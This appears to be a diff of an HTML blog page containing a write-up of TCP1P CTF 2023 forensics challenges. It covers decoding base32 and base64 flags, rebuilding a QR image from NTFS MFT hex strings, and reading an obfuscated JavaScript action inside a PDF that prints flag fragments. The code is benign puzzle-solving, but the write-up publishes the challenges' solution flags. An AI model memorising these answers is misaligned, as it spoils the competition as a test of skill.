-Out[<span style="color:#ae81ff">21</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;VENQMVB7cGRmX2g0djNfNF9QMWN0dXIzX2JsdXJfNG5kXzVoMWZ0fQo=&#39;</span>
-
-In [<span style="color:#ae81ff">22</span>]: b64decode(<span style="color:#e6db74">&#34;VENQMVB7cGRmX2g0djNfNF9QMWN0dXIzX2JsdXJfNG5kXzVoMWZ0fQo=&#34;</span>)
-Out[<span style="color:#ae81ff">22</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;TCP1P</span><span style="color:#e6db74">{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-</code></pre></div><p><code>FLAG: TCP1P{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">21</span>]: b32decode(<span style="color:#e6db74">&#34;KZCU4UKNKZBDOY2HKJWVQMTHGBSGUTTGJZDDSUKNK5HDAZCYJF5FQMSKONSFQSTGJZDTK22YPJLG6TKXLIYGMULPHU======&#34;</span>)
+</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">21</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;VENQMVB7cGRmX2g0djNfNF9QMWN0dXIzX2JsdXJfNG5kXzVoMWZ0fQo=&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">22</span>]: b64decode(<span style="color:#e6db74">&#34;VENQMVB7cGRmX2g0djNfNF9QMWN0dXIzX2JsdXJfNG5kXzVoMWZ0fQo=&#34;</span>)
+</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">22</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;TCP1P</span><span style="color:#e6db74">{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p><code>FLAG: TCP1P{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}</code></p>
 <h2 id="hide-and-split">hide and split</h2>
 <p>(128 Solves, 100 Points)</p>
 <p>Opening challenge.ntfs using Autopsy, we can see that the flag has been split into several parts.
@@ -783,28 +785,27 @@ Out[<span style="color:#ae81ff">22</span>]: <span style="color:#e6db74">b</span>
 <p>Looking at the Extracted Text of <code>MFT</code>, we can extract the hexstrings from each flag partitions, concatenate them, and potentially convert them to a PNG file that contains the flag.
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/Pasted%20image%2020231021024617.png?raw=true" alt=""></p>
 <p>After copy-pasting the content of Extracted Text from <code>$MFT</code> to <code>ntfs.txt</code>, using this code, we can extract only the hexstrings and convert it to <code>ntfs.png</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> re
-
-<span style="color:#75715e"># Read the text file</span>
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ntfs.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-    content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
-
-<span style="color:#75715e"># Extract hexadecimal strings based on the provided pattern</span>
-hex_strings <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;flag\d+\n\t([a-f0-9]+)&#39;</span>, content, re<span style="color:#f92672">.</span>IGNORECASE)
-
-<span style="color:#75715e"># Concatenate all the extracted hex strings</span>
-concatenated_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(hex_strings)
-
-<span style="color:#75715e"># Convert the concatenated hex string into bytes</span>
-byte_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(concatenated_hex)
-
-<span style="color:#75715e"># Write the bytes to an output file</span>
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ntfs.png &#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
-    f<span style="color:#f92672">.</span>write(byte_data)
-
-print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
-
-</code></pre></div><p>ntfs.png
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the text file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ntfs.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract hexadecimal strings based on the provided pattern</span>
+</span></span><span style="display:flex;"><span>hex_strings <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;flag\d+\n\t([a-f0-9]+)&#39;</span>, content, re<span style="color:#f92672">.</span>IGNORECASE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Concatenate all the extracted hex strings</span>
+</span></span><span style="display:flex;"><span>concatenated_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(hex_strings)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert the concatenated hex string into bytes</span>
+</span></span><span style="display:flex;"><span>byte_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(concatenated_hex)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write the bytes to an output file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ntfs.png &#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(byte_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span></code></pre></div><p>ntfs.png
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/ntfs.png?raw=true" alt="">
 After the QR code is scanned, the flag is obtained.</p>
 <p><code>FLAG: TCP1P{hidden_flag_in_the_extended_attributes_fea73c5920aa8f1c}</code></p>
@@ -829,72 +830,70 @@ Page Count                      : 1
 XMP Toolkit                     : Image::ExifTool 12.40
 Creator                         : SW4gdGhpcyBxdWVzdGlvbiwgdGhlIGZsYWcgaGFzIGJlZW4gZGl2aWRlZCBpbnRvIDMgcGFydHMuIFlvdSBoYXZlIGZvdW5kIHRoZSBmaXJzdCBwYXJ0IG9mIHRoZSBmbGFnISEgVENQMVB7RDAxbjlfRjAyM241MUM1
 </code></pre><p><strong>1st part of the flag</strong></p>
-<pre tabindex="0"><code>In [23]: b64decode(&quot;SW4gdGhpcyBxdWVzdGlvbiwgdGhlIGZsYWcgaGFzIGJlZW4gZGl2aWRlZCBpbnRvIDMgcGFydHMuIFlvdSBoYXZlIGZvdW5kIHRoZSBmaXJzdCBw
-    ...: YXJ0IG9mIHRoZSBmbGFnISEgVENQMVB7RDAxbjlfRjAyM241MUM1&quot;)
-Out[23]: b'In this question, the flag has been divided into 3 parts. You have found the first part of the flag!! TCP1P{D01n9_F023n51C5'
+<pre tabindex="0"><code>In [23]: b64decode(&#34;SW4gdGhpcyBxdWVzdGlvbiwgdGhlIGZsYWcgaGFzIGJlZW4gZGl2aWRlZCBpbnRvIDMgcGFydHMuIFlvdSBoYXZlIGZvdW5kIHRoZSBmaXJzdCBw
+    ...: YXJ0IG9mIHRoZSBmbGFnISEgVENQMVB7RDAxbjlfRjAyM241MUM1&#34;)
+Out[23]: b&#39;In this question, the flag has been divided into 3 parts. You have found the first part of the flag!! TCP1P{D01n9_F023n51C5&#39;
 </code></pre><p><strong>3rd part of the flag</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">└─$ pdf-parser TCP1P-CTF.pdf
-
-...
-
-obj <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">0</span>
- Type: /Action
- Referencing:
-
-  &lt;&lt;
-    /Type /Action
-    /S /JavaScript
-    /JS <span style="color:#e6db74">&#34;(var whutisthis = 1; if (whutisthis === 1) { this.print({bUI:true,bSilent:false,bShrinkToFit:true}); } else { function _0x510a(_0x4c8c49,_0x29ea76){var _0x5934bd=_0x5934();return _0x510a=function(_0x510a0b,_0x1b87bb){_0x510a0b=_0x510a0b-0x174;var _0x6c8a33=_0x5934bd[_0x510a0b];return _0x6c8a33;},_0x510a(_0x4c8c49,_0x29ea76);}(function(_0x39f268,_0x3518a2){var _0x43b398=_0x510a,_0x1759ee=_0x39f268();while(!![]){try{var _0x14396e=-parseInt(_0x43b398(0x175))/0x1*(-parseInt(_0x43b398(0x177))/0x2)+parseInt(_0x43b398(0x17e))/0x3+-parseInt(_0x43b398(0x17b))/0x4*(parseInt(_0x43b398(0x179))/0x5)+parseInt(_0x43b398(0x183))/0x6*(parseInt(_0x43b398(0x180))/0x7)+parseInt(_0x43b398(0x17f))/0x8+-parseInt(_0x43b398(0x17d))/0x9*(-parseInt(_0x43b398(0x17a))/0xa)+parseInt(_0x43b398(0x178))/0xb*(-parseInt(_0x43b398(0x182))/0xc);if(_0x14396e===_0x3518a2)break;else _0x1759ee[&#39;push&#39;](_0x1759ee[&#39;shift&#39;]());}catch(_0x21db70){_0x1759ee[&#39;push&#39;](_0x1759ee[&#39;shift&#39;]());}}}(_0x5934,0x1d736));function pdf(){var _0xcd7ad1=_0x510a;a=_0xcd7ad1(0x181),b=_0xcd7ad1(0x176),c=_0xcd7ad1(0x174),console[_0xcd7ad1(0x17c)](a+c+b);}pdf();function _0x5934(){var _0x3c1521=[&#39;_15N7_17&#39;,&#39;60PQFHXK&#39;,&#39;125706IwDCOY&#39;,&#39;_l3jaf9c&#39;,&#39;1aRbLpO&#39;,&#39;i293m1d}&#39;,&#39;52262iffCez&#39;,&#39;211310EDRVNg&#39;,&#39;913730rOiDAg&#39;,&#39;10xwGGOy&#39;,&#39;4mNGkXM&#39;,&#39;log&#39;,&#39;747855AiEFNc&#39;,&#39;333153VXlPoX&#39;,&#39;1265584ccEDtU&#39;,&#39;7BgPRoR&#39;];_0x5934=function(){return _0x3c1521;};return _0x5934();} })&#34;</span>
-  &gt;&gt;
-
-...
-
-</code></pre></div><p>After changing <code>var whutisthis = 1</code> to <code>var whutisthis = 0</code>, the JS code will print out the 3rd part of the flag when executed.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ pdf-parser TCP1P-CTF.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> Type: /Action
+</span></span><span style="display:flex;"><span> Referencing:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;&lt;
+</span></span><span style="display:flex;"><span>    /Type /Action
+</span></span><span style="display:flex;"><span>    /S /JavaScript
+</span></span><span style="display:flex;"><span>    /JS <span style="color:#e6db74">&#34;(var whutisthis = 1; if (whutisthis === 1) { this.print({bUI:true,bSilent:false,bShrinkToFit:true}); } else { function _0x510a(_0x4c8c49,_0x29ea76){var _0x5934bd=_0x5934();return _0x510a=function(_0x510a0b,_0x1b87bb){_0x510a0b=_0x510a0b-0x174;var _0x6c8a33=_0x5934bd[_0x510a0b];return _0x6c8a33;},_0x510a(_0x4c8c49,_0x29ea76);}(function(_0x39f268,_0x3518a2){var _0x43b398=_0x510a,_0x1759ee=_0x39f268();while(!![]){try{var _0x14396e=-parseInt(_0x43b398(0x175))/0x1*(-parseInt(_0x43b398(0x177))/0x2)+parseInt(_0x43b398(0x17e))/0x3+-parseInt(_0x43b398(0x17b))/0x4*(parseInt(_0x43b398(0x179))/0x5)+parseInt(_0x43b398(0x183))/0x6*(parseInt(_0x43b398(0x180))/0x7)+parseInt(_0x43b398(0x17f))/0x8+-parseInt(_0x43b398(0x17d))/0x9*(-parseInt(_0x43b398(0x17a))/0xa)+parseInt(_0x43b398(0x178))/0xb*(-parseInt(_0x43b398(0x182))/0xc);if(_0x14396e===_0x3518a2)break;else _0x1759ee[&#39;push&#39;](_0x1759ee[&#39;shift&#39;]());}catch(_0x21db70){_0x1759ee[&#39;push&#39;](_0x1759ee[&#39;shift&#39;]());}}}(_0x5934,0x1d736));function pdf(){var _0xcd7ad1=_0x510a;a=_0xcd7ad1(0x181),b=_0xcd7ad1(0x176),c=_0xcd7ad1(0x174),console[_0xcd7ad1(0x17c)](a+c+b);}pdf();function _0x5934(){var _0x3c1521=[&#39;_15N7_17&#39;,&#39;60PQFHXK&#39;,&#39;125706IwDCOY&#39;,&#39;_l3jaf9c&#39;,&#39;1aRbLpO&#39;,&#39;i293m1d}&#39;,&#39;52262iffCez&#39;,&#39;211310EDRVNg&#39;,&#39;913730rOiDAg&#39;,&#39;10xwGGOy&#39;,&#39;4mNGkXM&#39;,&#39;log&#39;,&#39;747855AiEFNc&#39;,&#39;333153VXlPoX&#39;,&#39;1265584ccEDtU&#39;,&#39;7BgPRoR&#39;];_0x5934=function(){return _0x3c1521;};return _0x5934();} })&#34;</span>
+</span></span><span style="display:flex;"><span>  &gt;&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>After changing <code>var whutisthis = 1</code> to <code>var whutisthis = 0</code>, the JS code will print out the 3rd part of the flag when executed.
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/Pasted%20image%2020231021031555.png?raw=true" alt=""></p>
 <p><strong>2nd part of the flag</strong>
 Looking closely at the rest of the ouput from <code>pdf-parser</code>, the pdf contains 2 image files in obj 10 and obj 11. However, there is only 1 image in the pdf which can be seen by eyes. This invisible image in the pdf might contain the 2nd part of the flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">└─$ pdf-parser TCP1P-CTF.pdf
-
-...
-
-obj <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
- Type: /XObject
- Referencing:
- Contains stream
-
-  &lt;&lt;
-    /Filter /FlateDecode
-    /Interpolate false
-    /Length <span style="color:#ae81ff">12364</span>
-    /ColorSpace /DeviceRGB
-    /Type /XObject
-    /BitsPerComponent <span style="color:#ae81ff">8</span>
-    /Height <span style="color:#ae81ff">112</span>
-    /Width <span style="color:#ae81ff">646</span>
-    /Subtype /Image
-  &gt;&gt;
-
-
-obj <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">0</span>
- Type: /XObject
- Referencing:
- Contains stream
-
-  &lt;&lt;
-    /Filter /FlateDecode
-    /Interpolate false
-    /Length <span style="color:#ae81ff">8066</span>
-    /ColorSpace /DeviceRGB
-    /Type /XObject
-    /BitsPerComponent <span style="color:#ae81ff">8</span>
-    /Height <span style="color:#ae81ff">391</span>
-    /Width <span style="color:#ae81ff">391</span>
-    /Subtype /Image
-  &gt;&gt;
-
-...
-
-</code></pre></div><p>The simplest way to extract all images embedded inside the pdf is by using online tool. <a href="https://pdfcandy.com/extract-images.html">Extract Images from PDF Online for Free (pdfcandy.com)</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ pdf-parser TCP1P-CTF.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> Type: /XObject
+</span></span><span style="display:flex;"><span> Referencing:
+</span></span><span style="display:flex;"><span> Contains stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;&lt;
+</span></span><span style="display:flex;"><span>    /Filter /FlateDecode
+</span></span><span style="display:flex;"><span>    /Interpolate false
+</span></span><span style="display:flex;"><span>    /Length <span style="color:#ae81ff">12364</span>
+</span></span><span style="display:flex;"><span>    /ColorSpace /DeviceRGB
+</span></span><span style="display:flex;"><span>    /Type /XObject
+</span></span><span style="display:flex;"><span>    /BitsPerComponent <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    /Height <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>    /Width <span style="color:#ae81ff">646</span>
+</span></span><span style="display:flex;"><span>    /Subtype /Image
+</span></span><span style="display:flex;"><span>  &gt;&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> Type: /XObject
+</span></span><span style="display:flex;"><span> Referencing:
+</span></span><span style="display:flex;"><span> Contains stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  &lt;&lt;
+</span></span><span style="display:flex;"><span>    /Filter /FlateDecode
+</span></span><span style="display:flex;"><span>    /Interpolate false
+</span></span><span style="display:flex;"><span>    /Length <span style="color:#ae81ff">8066</span>
+</span></span><span style="display:flex;"><span>    /ColorSpace /DeviceRGB
+</span></span><span style="display:flex;"><span>    /Type /XObject
+</span></span><span style="display:flex;"><span>    /BitsPerComponent <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    /Height <span style="color:#ae81ff">391</span>
+</span></span><span style="display:flex;"><span>    /Width <span style="color:#ae81ff">391</span>
+</span></span><span style="display:flex;"><span>    /Subtype /Image
+</span></span><span style="display:flex;"><span>  &gt;&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The simplest way to extract all images embedded inside the pdf is by using online tool. <a href="https://pdfcandy.com/extract-images.html">Extract Images from PDF Online for Free (pdfcandy.com)</a></p>
 <p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/image-000.png?raw=true" alt="">
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/image-001.png?raw=true" alt="">
 Indeed we got 2 images, in which the 1st image contains the 2nd part of the flag.</p>
@@ -959,7 +958,7 @@ Indeed we got 2 images, in which the 1st image contains the 2nd part of the flag
 >
   <div class="mr-auto">
     &copy; 2024
-    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
+    <a class="link" href="https://berliangabriel.github.io/">Berlian Gabriel</a>
   </div>
   <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
     >Powered by Hugo️️</a
